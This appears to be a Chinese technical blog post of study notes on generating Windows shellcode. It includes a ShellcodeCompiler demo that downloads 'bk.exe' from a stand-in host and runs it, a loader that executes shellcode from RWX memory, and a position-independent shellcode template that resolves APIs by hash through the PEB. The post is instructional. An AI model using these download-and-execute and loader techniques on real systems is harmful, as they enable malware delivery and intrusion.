---
title: Inter 自动化shellcode
tags: [汇编]
index_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png
banner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png
---

## 思路：

学习来源[3gstudent](https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/)

总结`3gstudent`的两篇文章

>小知识

|        类型         | 32位大小 | 64位大小 |
| :-----------------: | :------: | :------: |
|        char         | 1个字节  | 1个字节  |
| char*（即指针变量） | 4个字节  | 8个字节  |
|      short int      | 2个字节  | 2个字节  |
|         int         | 4个字节  | 4个字节  |
|    unsigned int     | 4个字节  | 4个字节  |
|        float        | 4个字节  | 4个字节  |
|       double        | 8个字节  | 8个字节  |
|        long         | 4个字节  | 8个字节  |
|      long long      | 8个字节  | 8个字节  |
|    unsigned long    | 4个字节  | 8个字节  |


## shellcode 生成的三种方法

### 1.手工

可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用

### 2.使用自动化工具
[shellcode compiler](https://github.com/NytroRST/ShellcodeCompiler)
使用的时候下载release程序，生成shellcode就能用。目前已经支持平台

> Windows (x86 and x64) and Linux (x86 and x64)

使用方法：给了很多例子，这里说明一个Demo
```c++
    function URLDownloadToFileA("urlmon.dll");     
	//等于GetProcAddress(LoadLibraryA("urlmon.dll"), "URLDownloadToFileA");
    function WinExec("kernel32.dll");
    function ExitProcess("kernel32.dll");

    URLDownloadToFileA(0,"https://site.com/bk.exe","bk.exe",0,0);    // 直接调用api即可
    WinExec("bk.exe",0);
    ExitProcess(0);
```
将上面的保存为sourse.txt，然后生成shellcode即可

命令详见github

生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试

下面时我的测试代码
```c++
#include <iostream>
#include <windows.h>
using namespace std;
size_t GetSize(LPSTR szFilePath)
{
	size_t Size_File = 0;
	FILE* fp;
	fopen_s(&fp, szFilePath, "rb");
	fseek(fp, 0, SEEK_END);
	Size_File = ftell(fp);
	rewind(fp);
	fclose(fp);
	return Size_File;
}

int main()
{
	char File_path[MAX_PATH] = { 0, };
#ifdef _WIN64
	cout << "Input 64bit Shellcode:";
#else
	cout << "Input 32bit Shellcode:";
#endif
	cin >> File_path;
	if (*File_path == NULL){return -1;}
	LPVOID lpBuffer = NULL;
	size_t Shellcode_Size = GetSize(File_path);
	lpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpBuffer){return -1;}
	FILE *fp;
	fopen_s(&fp, File_path, "rb");
	fread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);
	fclose(fp);

	(*(int(*)())lpBuffer)();//调用该函数

	VirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);
	return 0;
}

```


### 3.使用Visual Studio生成Shellcode

 **环境**

Visual Studio 2019（其他本版都行）
* 使用release生成
* 禁用优化
* 禁用安全检测（/GS-）

核心思路，不要使用全局变量，常见的字符串操作都自己写函数

代码参考3gstudent
```c++
#include <windows.h>
#include <Winternl.h>
#include <stdio.h>

#pragma optimize( "", off ) 
void shell_code();
HANDLE GetKernel32Handle();
BOOL __ISUPPER__(__in CHAR c);
CHAR __TOLOWER__(__in CHAR c);
UINT __STRLEN__(__in LPSTR lpStr1);
UINT __STRLENW__(__in LPWSTR lpStr1);
LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);
LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);
UINT __CalcHash__(__in LPVOID lpStr);

typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);
typedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);


void shell_code() {

	LoadLibraryWAPI	loadlibrarywapi = 0;
	GetProcAddressAPI getprocaddressapi = 0;
	MESSAGEBOXAPI messageboxapi = 0;

	wchar_t struser32[] = { L'u', L's', L'e', L'r', L'3',L'2', L'.', L'd', L'l', L'l', 0 };
	char MeassageboxA_api[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
	char MeassageText[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };

	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE) {
		return;
	}
	LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
	//CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
	//CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
	UINT HashrLoadLibraryA = 0x6fffef88;
	UINT HashrGetProcAddress = 0x3f8aaa7e;

	for (UINT i = 0; i < pExportDir->NumberOfNames; i++) {
		LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
		//if (!__STRCMPI__(pFuncName, strGetProcAddress)) {
		if (__CalcHash__(pFuncName) == HashrGetProcAddress) {
			getprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		//else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {
		else if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {
			loadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		if (getprocaddressapi != nullptr && loadlibrarywapi != nullptr) {
			messageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);
			messageboxapi(NULL, MeassageText, NULL, 0);
			return;
		}
	}
}

inline BOOL __ISUPPER__(__in CHAR c) {
	return ('A' <= c) && (c <= 'Z');
};
inline CHAR __TOLOWER__(__in CHAR c) {
	return __ISUPPER__(c) ? c - 'A' + 'a' : c;
};

UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != 0x0)
		i++;
	return i;
}

UINT __STRLENW__(__in LPWSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != L'\0')
		i++;
	return i;
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;
	UINT dwLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		} while (sc != c);
	} while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);
	return (lpStr1 - 1); // FIXME -2 ?
}

INT __STRCMPI__(
	__in LPSTR lpStr1,
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter & char is signed 
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) && (c1 != '\0') && (c2 != '\0'));
	return v;
}

INT __STRNCMPIW__(
	__in LPWSTR lpStr1,
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);
	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest,
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;
	while (*d) d++;
	do { *d++ = *s++; } while (*s);
	*d = 0x0;
	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst,
	__in LPVOID lpSrc,
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE)lpSrc;
	LPBYTE d = (LPBYTE)lpDst;
	while (dwCount--)
		* d++ = *s++;
	return lpDst;
}

UINT __CalcHash__(
	__in LPVOID lpStr
)
{
	UINT ApiHash = 0;
	LPBYTE s = (LPBYTE)lpStr;
	do
	{
		ApiHash = (ApiHash << 7) + (ApiHash >> 25) + *s;
	} while (*s++);
	return ApiHash;
}

HANDLE GetKernel32Handle() {
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead) {
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length) {
			DWORD dwLen = pModEntry->FullDllName.Length;
			__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
			strDllName[dwLen / sizeof(WCHAR)] = L'\0';
			if (__STRSTRIW__(strDllName, strKernel32)) {
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}
	return hKernel32;
}

//void __declspec(naked) END_SHELLCODE(void) {}

void END_SHELLCODE(void) {}

int main()
{
	shell_code();
	FILE* output_file;
#ifdef _WIN64
	fopen_s(&output_file, "shellcode_x64.bin", "wb");
#else
	fopen_s(&output_file, "shellcode_x32.bin", "wb");
#endif
	fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
	fclose(output_file);
	return 0;
}
```
稍微修改了一点，使用**x64**位编译就可以生成**64位shellcode**，使用**x32**就能生成32位**shellcode**。

使用了**hash函数名**的方式去找API，不用开那么大栈空间

总结一下：

类似`memcpy、strlen、strcat`等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。

C++ 中字符数组定义格式有下面三种

```c++
    const char* str1 = "I am Str1!";
	char str2[] = "I am Str2!";
	char str3[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };
```
前面两种都是将字符串保存在`rdata`段中，第三种方式是将字符串保存在栈中，最后的0表示'\0',如果没有结束标志，可能会操作到栈后面的数据。